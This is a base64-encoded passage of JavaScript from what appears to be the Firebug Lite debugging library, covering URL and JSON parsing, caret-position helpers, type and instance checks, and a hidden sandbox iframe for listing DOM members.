NvbXBvbmVudChwYXJ0c1sxXSldfSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgcGFyYW1zLnB1c2goe25hbWU6IGRlY29kZVVSSUNvbXBvbmVudChwYXJ0c1swXSksIHZhbHVlOiBbIiJdfSk7DQogICAgICAgIH0NCiAgICAgICAgY2F0Y2ggKGUpDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmIChGQlRyYWNlLkRCR19FUlJPUlMpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgRkJUcmFjZS5zeXNvdXQoInBhcnNlVVJMRW5jb2RlZFRleHQgRVhDRVBUSU9OICIsIGUpOw0KICAgICAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJwYXJzZVVSTEVuY29kZWRUZXh0IEVYQ0VQVElPTiBVUkkiLCBhcmdzW2ldKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIHBhcmFtcy5zb3J0KGZ1bmN0aW9uKGEsIGIpIHsgcmV0dXJuIGEubmFtZSA8PSBiLm5hbWUgPyAtMSA6IDE7IH0pOw0KDQogICAgcmV0dXJuIHBhcmFtczsNCn07DQoNCnRoaXMucmVFbmNvZGVVUkwgPSBmdW5jdGlvbihmaWxlLCB0ZXh0KQ0Kew0KICAgIHZhciBsaW5lcyA9IHRleHQuc3BsaXQoIlxuIik7DQogICAgdmFyIHBhcmFtcyA9IHRoaXMucGFyc2VVUkxFbmNvZGVkVGV4dChsaW5lc1tsaW5lcy5sZW5ndGgtMV0pOw0KDQogICAgdmFyIGFyZ3MgPSBbXTsNCiAgICBmb3IgKHZhciBpID0gMDsgaSA8IHBhcmFtcy5sZW5ndGg7ICsraSkNCiAgICAgICAgYXJncy5wdXNoKGVuY29kZVVSSUNvbXBvbmVudChwYXJhbXNbaV0ubmFtZSkrIj0iK2VuY29kZVVSSUNvbXBvbmVudChwYXJhbXNbaV0udmFsdWUpKTsNCg0KICAgIHZhciB1cmwgPSBmaWxlLmhyZWY7DQogICAgdXJsICs9ICh1cmwuaW5kZXhPZigiPyIpID09IC0xID8gIj8iIDogIiYiKSArIGFyZ3Muam9pbigiJiIpOw0KDQogICAgcmV0dXJuIHVybDsNCn07DQoNCnRoaXMuZ2V0UmVzb3VyY2UgPSBmdW5jdGlvbihhVVJMKQ0Kew0KICAgIHRyeQ0KICAgIHsNCiAgICAgICAgdmFyIGNoYW5uZWw9aW9TZXJ2aWNlLm5ld0NoYW5uZWwoYVVSTCxudWxsLG51bGwpOw0KICAgICAgICB2YXIgaW5wdXQ9Y2hhbm5lbC5vcGVuKCk7DQogICAgICAgIHJldHVybiBGQkwucmVhZEZyb21TdHJlYW0oaW5wdXQpOw0KICAgIH0NCiAgICBjYXRjaCAoZSkNCiAgICB7DQogICAgICAgIGlmIChGQlRyYWNlLkRCR19FUlJPUlMpDQogICAgICAgICAgICBGQlRyYWNlLnN5c291dCgibGliLmdldFJlc291cmNlIEZBSUxTIGZvciAiK2FVUkwsIGUpOw0KICAgIH0NCn07DQoNCnRoaXMucGFyc2VKU09OU3RyaW5nID0gZnVuY3Rpb24oanNvblN0cmluZywgb3JpZ2luVVJMKQ0Kew0KICAgIC8vIFNlZSBpZiB0aGlzIGlzIGEgUHJvdG90eXBlIHN0eWxlICotc2VjdXJlIHJlcXVlc3QuDQogICAgdmFyIHJlZ2V4ID0gbmV3IFJlZ0V4cCgvXlwvXCotc2VjdXJlLShbXHNcU10qKVwqXC9ccyokLyk7DQogICAgdmFyIG1hdGNoZXMgPSByZWdleC5leGVjKGpzb25TdHJpbmcpOw0KDQogICAgaWYgKG1hdGNoZXMpDQogICAgew0KICAgICAgICBqc29uU3RyaW5nID0gbWF0Y2hlc1sxXTsNCg0KICAgICAgICBpZiAoanNvblN0cmluZ1swXSA9PSAiXFwiICYmIGpzb25TdHJpbmdbMV0gPT0gIm4iKQ0KICAgICAgICAgICAganNvblN0cmluZyA9IGpzb25TdHJpbmcuc3Vic3RyKDIpOw0KDQogICAgICAgIGlmIChqc29uU3RyaW5nW2pzb25TdHJpbmcubGVuZ3RoLTJdID09ICJcXCIgJiYganNvblN0cmluZ1tqc29uU3RyaW5nLmxlbmd0aC0xXSA9PSAibiIpDQogICAgICAgICAgICBqc29uU3RyaW5nID0ganNvblN0cmluZy5zdWJzdHIoMCwganNvblN0cmluZy5sZW5ndGgtMik7DQogICAgfQ0KDQogICAgaWYgKGpzb25TdHJpbmcuaW5kZXhPZigiJiYmU1RBUlQmJiYiKSkNCiAgICB7DQogICAgICAgIHJlZ2V4ID0gbmV3IFJlZ0V4cCgvJiYmU1RBUlQmJiYgKC4rKSAmJiZFTkQmJiYvKTsNCiAgICAgICAgbWF0Y2hlcyA9IHJlZ2V4LmV4ZWMoanNvblN0cmluZyk7DQogICAgICAgIGlmIChtYXRjaGVzKQ0KICAgICAgICAgICAganNvblN0cmluZyA9IG1hdGNoZXNbMV07DQogICAgfQ0KDQogICAgLy8gdGhyb3cgb24gdGhlIGV4dHJhIHBhcmVudGhlc2VzDQogICAganNvblN0cmluZyA9ICIoIiArIGpzb25TdHJpbmcgKyAiKSI7DQoNCiAgICAvLy92YXIgcyA9IENvbXBvbmVudHMudXRpbHMuU2FuZGJveChvcmlnaW5VUkwpOw0KICAgIHZhciBqc29uT2JqZWN0ID0gbnVsbDsNCg0KICAgIHRyeQ0KICAgIHsNCiAgICAgICAgLy8vanNvbk9iamVjdCA9IENvbXBvbmVudHMudXRpbHMuZXZhbEluU2FuZGJveChqc29uU3RyaW5nLCBzKTsNCiAgICAgICAgDQogICAgICAgIC8vanNvbk9iamVjdCA9IEZpcmVidWcuY29udGV4dC5ldmFsKGpzb25TdHJpbmcpOw0KICAgICAgICBqc29uT2JqZWN0ID0gRmlyZWJ1Zy5jb250ZXh0LmV2YWx1YXRlKGpzb25TdHJpbmcsIG51bGwsIG51bGwsIGZ1bmN0aW9uKCl7cmV0dXJuIG51bGw7fSk7DQogICAgfQ0KICAgIGNhdGNoKGUpDQogICAgew0KICAgICAgICAvKioqDQogICAgICAgIGlmIChlLm1lc3NhZ2UuaW5kZXhPZigiaXMgbm90IGRlZmluZWQiKSkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIHBhcnRzID0gZS5tZXNzYWdlLnNwbGl0KCIgIik7DQogICAgICAgICAgICBzW3BhcnRzWzBdXSA9IGZ1bmN0aW9uKHN0cil7IHJldHVybiBzdHI7IH07DQogICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgIGpzb25PYmplY3QgPSBDb21wb25lbnRzLnV0aWxzLmV2YWxJblNhbmRib3goanNvblN0cmluZywgcyk7DQogICAgICAgICAgICB9IGNhdGNoKGV4KSB7DQogICAgICAgICAgICAgICAgaWYgKEZCVHJhY2UuREJHX0VSUk9SUyB8fCBGQlRyYWNlLkRCR19KU09OVklFV0VSKQ0KICAgICAgICAgICAgICAgICAgICBGQlRyYWNlLnN5c291dCgianNvbnZpZXdlci5wYXJzZUpTT04gRVhDRVBUSU9OIiwgZSk7DQogICAgICAgICAgICAgICAgcmV0dXJuIG51bGw7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgZWxzZQ0KICAgICAgICB7LyoqLw0KICAgICAgICAgICAgaWYgKEZCVHJhY2UuREJHX0VSUk9SUyB8fCBGQlRyYWNlLkRCR19KU09OVklFV0VSKQ0KICAgICAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJqc29udmlld2VyLnBhcnNlSlNPTiBFWENFUFRJT04iLCBlKTsNCiAgICAgICAgICAgIHJldHVybiBudWxsOw0KICAgICAgICAvLy99DQogICAgfQ0KDQogICAgcmV0dXJuIGpzb25PYmplY3Q7DQp9Ow0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KdGhpcy5vYmplY3RUb1N0cmluZyA9IGZ1bmN0aW9uKG9iamVjdCkNCnsNCiAgICB0cnkNCiAgICB7DQogICAgICAgIHJldHVybiBvYmplY3QrIiI7DQogICAgfQ0KICAgIGNhdGNoIChleGMpDQogICAgew0KICAgICAgICByZXR1cm4gbnVsbDsNCiAgICB9DQp9Ow0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIElucHV0IENhcmV0IFBvc2l0aW9uDQoNCnRoaXMuc2V0U2VsZWN0aW9uUmFuZ2UgPSBmdW5jdGlvbihpbnB1dCwgc3RhcnQsIGxlbmd0aCkNCnsNCiAgICBpZiAoaW5wdXQuY3JlYXRlVGV4dFJhbmdlKQ0KICAgIHsNCiAgICAgICAgdmFyIHJhbmdlID0gaW5wdXQuY3JlYXRlVGV4dFJhbmdlKCk7IA0KICAgICAgICByYW5nZS5tb3ZlU3RhcnQoImNoYXJhY3RlciIsIHN0YXJ0KTsgDQogICAgICAgIHJhbmdlLm1vdmVFbmQoImNoYXJhY3RlciIsIGxlbmd0aCAtIGlucHV0LnZhbHVlLmxlbmd0aCk7IA0KICAgICAgICByYW5nZS5zZWxlY3QoKTsNCiAgICB9DQogICAgZWxzZSBpZiAoaW5wdXQuc2V0U2VsZWN0aW9uUmFuZ2UpDQogICAgew0KICAgICAgICBpbnB1dC5zZXRTZWxlY3Rpb25SYW5nZShzdGFydCwgbGVuZ3RoKTsNCiAgICAgICAgaW5wdXQuZm9jdXMoKTsNCiAgICB9DQp9Ow0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIElucHV0IFNlbGVjdGlvbiBTdGFydCAvIENhcmV0IFBvc2l0aW9uDQoNCnRoaXMuZ2V0SW5wdXRTZWxlY3Rpb25TdGFydCA9IGZ1bmN0aW9uKGlucHV0KQ0Kew0KICAgIGlmIChkb2N1bWVudC5zZWxlY3Rpb24pDQogICAgew0KICAgICAgICB2YXIgcmFuZ2UgPSBpbnB1dC5vd25lckRvY3VtZW50LnNlbGVjdGlvbi5jcmVhdGVSYW5nZSgpOw0KICAgICAgICB2YXIgdGV4dCA9IHJhbmdlLnRleHQ7DQogICAgICAgIA0KICAgICAgICAvL2NvbnNvbGUubG9nKCJyYW5nZSIsIHJhbmdlLnRleHQpOw0KICAgICAgICANCiAgICAgICAgLy8gaWYgdGhlcmUgaXMgYSBzZWxlY3Rpb24sIGZpbmQgdGhlIHN0YXJ0IHBvc2l0aW9uDQogICAgICAgIGlmICh0ZXh0KQ0KICAgICAgICB7DQogICAgICAgICAgICByZXR1cm4gaW5wdXQudmFsdWUuaW5kZXhPZih0ZXh0KTsNCiAgICAgICAgfQ0KICAgICAgICAvLyBpZiB0aGVyZSBpcyBubyBzZWxlY3Rpb24sIGZpbmQgdGhlIGNhcmV0IHBvc2l0aW9uDQogICAgICAgIGVsc2UNCiAgICAgICAgew0KICAgICAgICAgICAgcmFuZ2UubW92ZVN0YXJ0KCJjaGFyYWN0ZXIiLCAtaW5wdXQudmFsdWUubGVuZ3RoKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgcmV0dXJuIHJhbmdlLnRleHQubGVuZ3RoOw0KICAgICAgICB9DQogICAgfQ0KICAgIGVsc2UgaWYgKHR5cGVvZiBpbnB1dC5zZWxlY3Rpb25TdGFydCAhPSAidW5kZWZpbmVkIikNCiAgICAgICAgcmV0dXJuIGlucHV0LnNlbGVjdGlvblN0YXJ0Ow0KICAgIA0KICAgIHJldHVybiAwOw0KfTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovLyBPcGVyYSBUYWIgRml4DQoNCmZ1bmN0aW9uIG9uT3BlcmFUYWJCbHVyKGUpDQp7DQogICAgaWYgKHRoaXMubGFzdEtleSA9PSA5KQ0KICAgICAgdGhpcy5mb2N1cygpOw0KfTsNCg0KZnVuY3Rpb24gb25PcGVyYVRhYktleURvd24oZSkNCnsNCiAgICB0aGlzLmxhc3RLZXkgPSBlLmtleUNvZGU7DQp9Ow0KDQpmdW5jdGlvbiBvbk9wZXJhVGFiRm9jdXMoZSkNCnsNCiAgICB0aGlzLmxhc3RLZXkgPSBudWxsOw0KfTsNCg0KdGhpcy5maXhPcGVyYVRhYktleSA9IGZ1bmN0aW9uKGVsKQ0Kew0KICAgIGVsLm9uZm9jdXMgPSBvbk9wZXJhVGFiRm9jdXM7DQogICAgZWwub25ibHVyID0gb25PcGVyYVRhYkJsdXI7DQogICAgZWwub25rZXlkb3duID0gb25PcGVyYVRhYktleURvd247DQp9Ow0KDQovLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQp0aGlzLlByb3BlcnR5ID0gZnVuY3Rpb24ob2JqZWN0LCBuYW1lKQ0Kew0KICAgIHRoaXMub2JqZWN0ID0gb2JqZWN0Ow0KICAgIHRoaXMubmFtZSA9IG5hbWU7DQoNCiAgICB0aGlzLmdldE9iamVjdCA9IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHJldHVybiBvYmplY3RbbmFtZV07DQogICAgfTsNCn07DQoNCnRoaXMuRXJyb3JDb3B5ID0gZnVuY3Rpb24obWVzc2FnZSkNCnsNCiAgICB0aGlzLm1lc3NhZ2UgPSBtZXNzYWdlOw0KfTsNCg0KZnVuY3Rpb24gRXZlbnRDb3B5KGV2ZW50KQ0Kew0KICAgIC8vIEJlY2F1c2UgZXZlbnQgb2JqZWN0cyBhcmUgZGVzdHJveWVkIGFyYml0cmFyaWx5IGJ5IEdlY2tvLCB3ZSBtdXN0IG1ha2UgYSBjb3B5IG9mIHRoZW0gdG8NCiAgICAvLyByZXByZXNlbnQgdGhlbSBsb25nIHRlcm0gaW4gdGhlIGluc3BlY3Rvci4NCiAgICBmb3IgKHZhciBuYW1lIGluIGV2ZW50KQ0KICAgIHsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIHRoaXNbbmFtZV0gPSBldmVudFtuYW1lXTsNCiAgICAgICAgfSBjYXRjaCAoZXhjKSB7IH0NCiAgICB9DQp9DQoNCnRoaXMuRXZlbnRDb3B5ID0gRXZlbnRDb3B5Ow0KDQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gVHlwZSBDaGVja2luZw0KDQp2YXIgdG9TdHJpbmcgPSBPYmplY3QucHJvdG90eXBlLnRvU3RyaW5nOw0KdmFyIHJlRnVuY3Rpb24gPSAvXlxzKmZ1bmN0aW9uKFxzK1tcd18kXVtcd1xkXyRdKik/XHMqXCgvOyANCg0KdGhpcy5pc0FycmF5ID0gZnVuY3Rpb24ob2JqZWN0KSB7DQogICAgcmV0dXJuIHRvU3RyaW5nLmNhbGwob2JqZWN0KSA9PT0gJ1tvYmplY3QgQXJyYXldJzsgDQp9Ow0KDQp0aGlzLmlzRnVuY3Rpb24gPSBmdW5jdGlvbihvYmplY3QpIHsNCiAgICBpZiAoIW9iamVjdCkgcmV0dXJuIGZhbHNlOw0KICAgIA0KICAgIHRyeQ0KICAgIHsNCiAgICAgICAgLy8gRklYTUU6IHh4eHBlZHJvIHRoaXMgaXMgZmFpbGluZyBpbiBJRSBmb3IgdGhlIGdsb2JhbCAiZXh0ZXJuYWwiIG9iamVjdA0KICAgICAgICByZXR1cm4gdG9TdHJpbmcuY2FsbChvYmplY3QpID09PSAiW29iamVjdCBGdW5jdGlvbl0iIHx8IA0KICAgICAgICAgICAgICAgIHRoaXMuaXNJRSAmJiB0eXBlb2Ygb2JqZWN0ICE9ICJzdHJpbmciICYmIHJlRnVuY3Rpb24udGVzdCgiIitvYmplY3QpOw0KICAgIH0NCiAgICBjYXRjaCAoRSkNCiAgICB7DQogICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJMaWIuaXNGdW5jdGlvbigpIGZhaWxlZCBmb3IgIiwgb2JqZWN0KTsNCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0NCn07DQogICAgDQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gSW5zdGFuY2UgQ2hlY2tpbmcNCg0KdGhpcy5pbnN0YW5jZU9mID0gZnVuY3Rpb24ob2JqZWN0LCBjbGFzc05hbWUpDQp7DQogICAgaWYgKCFvYmplY3QgfHwgdHlwZW9mIG9iamVjdCAhPSAib2JqZWN0IikNCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIA0KICAgIC8vIFRyeSB0byB1c2UgdGhlIG5hdGl2ZSBpbnN0YW5jZW9mIG9wZXJhdG9yLiBXZSBjYW4gb25seSB1c2UgaXQgd2hlbiB3ZSBrbm93DQogICAgLy8gZXhhY3RseSB0aGUgd2luZG93IHdoZXJlIHRoZSBvYmplY3QgaXMgbG9jYXRlZCBhdA0KICAgIGlmIChvYmplY3Qub3duZXJEb2N1bWVudCkNCiAgICB7DQogICAgICAgIC8vIGZpbmQgdGhlIGNvcnJlY3Qgd2luZG93IG9mIHRoZSBvYmplY3QNCiAgICAgICAgdmFyIHdpbiA9IG9iamVjdC5vd25lckRvY3VtZW50LmRlZmF1bHRWaWV3IHx8IG9iamVjdC5vd25lckRvY3VtZW50LnBhcmVudFdpbmRvdzsNCiAgICAgICAgDQogICAgICAgIC8vIGlmIHRoZSBjbGFzcyBpcyBhY2Nlc3NpYmxlIGluIHRoZSB3aW5kb3csIHVzZXMgdGhlIG5hdGl2ZSBpbnN0YW5jZW9mIG9wZXJhdG9yDQogICAgICAgIC8vIGlmIHRoZSBpbnN0YW5jZW9mIGV2YWx1YXRlcyB0byAidHJ1ZSIgd2UgY2FuIGFzc3VtZSBpdCBpcyBhIGluc3RhbmNlLCBidXQgaWYgaXQNCiAgICAgICAgLy8gZXZhbHVhdGVzIHRvICJmYWxzZSIgd2UgbXVzdCBjb250aW51ZSB3aXRoIHRoZSBkdWNrIHR5cGUgZGV0ZWN0aW9uIGJlbG93IGJlY2F1c2UNCiAgICAgICAgLy8gdGhlIG5hdGl2ZSBvYmplY3QgbWF5IGJlIGV4dGVuZGVkLCB0aHVzIGJyZWFraW5nIHRoZSBpbnN0YW5jZW9mIHJlc3VsdCANCiAgICAgICAgLy8gU2VlIElzc3VlIDM1MjQ6IEZpcmVidWcgTGl0ZSBTdHlsZSBQYW5lbCBkb2Vzbid0IHdvcmsgaWYgdGhlIG5hdGl2ZSBFbGVtZW50IGlzIGV4dGVuZGVkDQogICAgICAgIGlmIChjbGFzc05hbWUgaW4gd2luICYmIG9iamVjdCBpbnN0YW5jZW9mIHdpbltjbGFzc05hbWVdKQ0KICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgfQ0KICAgIC8vIElmIHRoZSBvYmplY3QgZG9lc24ndCBoYXZlIHRoZSBvd25lckRvY3VtZW50IHByb3BlcnR5LCB3ZSdsbCB0cnkgdG8gbG9vayBhdA0KICAgIC8vIHRoZSBjdXJyZW50IGNvbnRleHQncyB3aW5kb3cNCiAgICBlbHNlDQogICAgew0KICAgICAgICAvLyBUT0RPOiB4eHhwZWRybyBjb250ZXh0DQogICAgICAgIC8vIFNpbmNlIHdlJ3JlIG5vdCB1c2luZyB5ZXQgYSBGaXJlYnVnLmNvbnRleHQsIHdlJ2xsIGp1c3QgdXNlIHRoZSB0b3Agd2luZG93DQogICAgICAgIC8vIChicm93c2VyKSBhcyBhIHJlZmVyZW5jZQ0KICAgICAgICB2YXIgd2luID0gRmlyZWJ1Zy5icm93c2VyLndpbmRvdzsNCiAgICAgICAgaWYgKGNsYXNzTmFtZSBpbiB3aW4pDQogICAgICAgICAgICByZXR1cm4gb2JqZWN0IGluc3RhbmNlb2Ygd2luW2NsYXNzTmFtZV07DQogICAgfQ0KICAgIA0KICAgIC8vIGdldCB0aGUgZHVjayB0eXBlIG1vZGVsIGZyb20gdGhlIGNhY2hlIA0KICAgIHZhciBjYWNoZSA9IGluc3RhbmNlQ2hlY2tNYXBbY2xhc3NOYW1lXTsNCiAgICBpZiAoIWNhY2hlKQ0KICAgICAgICByZXR1cm4gZmFsc2U7DQoNCiAgICAvLyBzdGFydHMgdGhlIGhhY2t5IGR1Y2sgdHlwZSBkZXRlY3Rpb24NCiAgICBmb3IodmFyIG4gaW4gY2FjaGUpDQogICAgew0KICAgICAgICB2YXIgb2JqID0gY2FjaGVbbl07DQogICAgICAgIHZhciB0eXBlID0gdHlwZW9mIG9iajsNCiAgICAgICAgb2JqID0gdHlwZSA9PSAib2JqZWN0IiA/IG9iaiA6IFtvYmpdOw0KICAgICAgICANCiAgICAgICAgZm9yKHZhciBuYW1lIGluIG9iaikNCiAgICAgICAgew0KICAgICAgICAgICAgLy8gYXZvaWQgcHJvYmxlbXMgd2l0aCBleHRlbmRlZCBuYXRpdmUgb2JqZWN0cw0KICAgICAgICAgICAgLy8gU2VlIElzc3VlIDM1MjQ6IEZpcmVidWcgTGl0ZSBTdHlsZSBQYW5lbCBkb2Vzbid0IHdvcmsgaWYgdGhlIG5hdGl2ZSBFbGVtZW50IGlzIGV4dGVuZGVkDQogICAgICAgICAgICBpZiAoIW9iai5oYXNPd25Qcm9wZXJ0eShuYW1lKSkNCiAgICAgICAgICAgICAgICBjb250aW51ZTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgdmFyIHZhbHVlID0gb2JqW25hbWVdOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiggbiA9PSAicHJvcGVydHkiICYmICEodmFsdWUgaW4gb2JqZWN0KSB8fA0KICAgICAgICAgICAgICAgIG4gPT0gIm1ldGhvZCIgJiYgIXRoaXMuaXNGdW5jdGlvbihvYmplY3RbdmFsdWVdKSB8fA0KICAgICAgICAgICAgICAgIG4gPT0gInZhbHVlIiAmJiAoIiIrb2JqZWN0W25hbWVdKS50b0xvd2VyQ2FzZSgpICE9ICgiIit2YWx1ZSkudG9Mb3dlckNhc2UoKSApDQogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICANCiAgICByZXR1cm4gdHJ1ZTsNCn07DQoNCnZhciBpbnN0YW5jZUNoZWNrTWFwID0gDQp7DQogICAgLy8gRHVja1R5cGVDaGVjazoNCiAgICAvLyB7DQogICAgLy8gICAgIHByb3BlcnR5OiBbIndpbmRvdyIsICJkb2N1bWVudCJdLA0KICAgIC8vICAgICBtZXRob2Q6ICJzZXRUaW1lb3V0IiwNCiAgICAvLyAgICAgdmFsdWU6IHtub2RlVHlwZTogMX0NCiAgICAvLyB9LA0KICAgIA0KICAgIFdpbmRvdzoNCiAgICB7DQogICAgICAgIHByb3BlcnR5OiBbIndpbmRvdyIsICJkb2N1bWVudCJdLA0KICAgICAgICBtZXRob2Q6ICJzZXRUaW1lb3V0Ig0KICAgIH0sDQogICAgDQogICAgRG9jdW1lbnQ6DQogICAgew0KICAgICAgICBwcm9wZXJ0eTogWyJib2R5IiwgImNvb2tpZSJdLA0KICAgICAgICBtZXRob2Q6ICJnZXRFbGVtZW50QnlJZCINCiAgICB9LA0KICAgIA0KICAgIE5vZGU6DQogICAgew0KICAgICAgICBwcm9wZXJ0eTogIm93bmVyRG9jdW1lbnQiLA0KICAgICAgICBtZXRob2Q6ICJhcHBlbmRDaGlsZCINCiAgICB9LA0KICAgIA0KICAgIEVsZW1lbnQ6DQogICAgew0KICAgICAgICBwcm9wZXJ0eTogInRhZ05hbWUiLA0KICAgICAgICB2YWx1ZToge25vZGVUeXBlOiAxfQ0KICAgIH0sDQogICAgDQogICAgTG9jYXRpb246DQogICAgew0KICAgICAgICBwcm9wZXJ0eTogWyJob3N0bmFtZSIsICJwcm90b2NvbCJdLA0KICAgICAgICBtZXRob2Q6ICJhc3NpZ24iDQogICAgfSwNCiAgICANCiAgICBIVE1MSW1hZ2VFbGVtZW50Og0KICAgIHsNCiAgICAgICAgcHJvcGVydHk6ICJ1c2VNYXAiLA0KICAgICAgICB2YWx1ZToNCiAgICAgICAgew0KICAgICAgICAgICAgbm9kZVR5cGU6IDEsDQogICAgICAgICAgICB0YWdOYW1lOiAiaW1nIg0KICAgICAgICB9DQogICAgfSwNCiAgICANCiAgICBIVE1MQW5jaG9yRWxlbWVudDoNCiAgICB7DQogICAgICAgIHByb3BlcnR5OiAiaHJlZmxhbmciLA0KICAgICAgICB2YWx1ZToNCiAgICAgICAgew0KICAgICAgICAgICAgbm9kZVR5cGU6IDEsDQogICAgICAgICAgICB0YWdOYW1lOiAiYSINCiAgICAgICAgfQ0KICAgIH0sDQogICAgDQogICAgSFRNTElucHV0RWxlbWVudDoNCiAgICB7DQogICAgICAgIHByb3BlcnR5OiAiZm9ybSIsDQogICAgICAgIHZhbHVlOg0KICAgICAgICB7DQogICAgICAgICAgICBub2RlVHlwZTogMSwNCiAgICAgICAgICAgIHRhZ05hbWU6ICJpbnB1dCINCiAgICAgICAgfQ0KICAgIH0sDQogICAgDQogICAgSFRNTEJ1dHRvbkVsZW1lbnQ6DQogICAgew0KICAgICAgICAvLyA/ICAgICAgICANCiAgICB9LA0KICAgIA0KICAgIEhUTUxGb3JtRWxlbWVudDoNCiAgICB7DQogICAgICAgIG1ldGhvZDogInN1Ym1pdCIsDQogICAgICAgIHZhbHVlOg0KICAgICAgICB7DQogICAgICAgICAgICBub2RlVHlwZTogMSwNCiAgICAgICAgICAgIHRhZ05hbWU6ICJmb3JtIg0KICAgICAgICB9DQogICAgfSwNCiAgICANCiAgICBIVE1MQm9keUVsZW1lbnQ6DQogICAgew0KICAgICAgICANCiAgICB9LA0KICAgIA0KICAgIEhUTUxIdG1sRWxlbWVudDoNCiAgICB7DQogICAgICAgIA0KICAgIH0sDQogICAgDQogICAgQ1NTU3R5bGVSdWxlOg0KICAgIHsNCiAgICAgICAgcHJvcGVydHk6IFsic2VsZWN0b3JUZXh0IiwgInN0eWxlIl0NCiAgICB9DQogICAgDQp9Ow0KDQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gRE9NIENvbnN0YW50cw0KDQovKg0KDQpQcm9ibGVtczoNCg0KICAtIElFIGRvZXMgbm90IGhhdmUgd2luZG93Lk5vZGUsIHdpbmRvdy5FbGVtZW50LCBldGMNCiAgLSBmb3IgKHZhciBuYW1lIGluIE5vZGUucHJvdG90eXBlKSByZXR1cm4gbm90aGluZyBvbiBGRg0KDQoqLw0KDQoNCnZhciBkb21NZW1iZXJNYXAyID0ge307DQoNCnZhciBkb21NZW1iZXJNYXAyU2FuZGJveCA9IG51bGw7DQoNCnZhciBnZXREb21NZW1iZXJNYXAyID0gZnVuY3Rpb24obmFtZSkNCnsNCiAgICBpZiAoIWRvbU1lbWJlck1hcDJTYW5kYm94KQ0KICAgIHsNCiAgICAgICAgdmFyIGRvYyA9IEZpcmVidWcuY2hyb21lLmRvY3VtZW50Ow0KICAgICAgICB2YXIgZnJhbWUgPSBkb2MuY3JlYXRlRWxlbWVudCgiaWZyYW1lIik7DQogICAgICAgIA0KICAgICAgICBmcmFtZS5pZCA9ICJGaXJlYnVnU2FuZGJveCI7DQogICAgICAgIGZyYW1lLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7DQogICAgICAgIGZyYW1lLnNyYyA9ICJhYm91dDpibGFuayI7DQogICAgICAgIA0KICAgICAgICBkb2MuYm9keS5hcHBlbmRDaGlsZChmcmFtZSk7DQogICAgICAgIA0KICAgICAgICBkb21NZW1iZXJNYXAyU2FuZGJveCA9IGZyYW1lLndpbmRvdyB8fCBmcmFtZS5jb250ZW50V2luZG93Ow0KICAgIH0NCiAgICANCiAgICB2YXIgcHJvcHMgPSBbXTsNCiAgICANCiAgICAvL3ZhciBvYmplY3QgPSBkb21NZW1iZXJNYXAyU2FuZGJveFtuYW1lXTsNCiAgICAvL29iamVjdCA9IG9iamVjdC5wcm90b3R5cGUgfHwgb2JqZWN0Ow0KICAgIA0KICAgIHZhciBvYmplY3QgPSBudWxsOw0KICAgIA0KICAgIGlmIChuYW1lID09ICJXaW5kb3ciKQ0KICAgICAgICBvYmplY3QgPSBkb21NZW1iZXJNYXAyU2FuZGJveC53aW5kb3c7DQogICAgDQogICAgZWxzZSBpZiAobmFtZSA9PSAiRG9jdW1lbnQiKQ0KICAgICAgICBvYmplY3QgPSBkb21NZW1iZXJNYXAyU2FuZGJveC5kb2N1bWVudDsNCiAgICAgICAgDQogICAgZWxzZSBpZiAobmFtZSA9PSAiSFRNTFNjcmlwdEVsZW1lbnQiKQ0KICAgICAgICBvYmplY3QgPSBkb21NZW1iZXJNYXAyU2FuZGJveC5kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTsNCiAgICANCiAgICBlbHNlIGlmIChuYW1lID09ICJIVE1MQW5jaG9yRWxlbWVudCIpDQogICAgICAgIG9iamVjdCA9IGRvbU1lbWJlck1hcDJTYW5kYm94LmRvY3VtZW50LmNyZWF0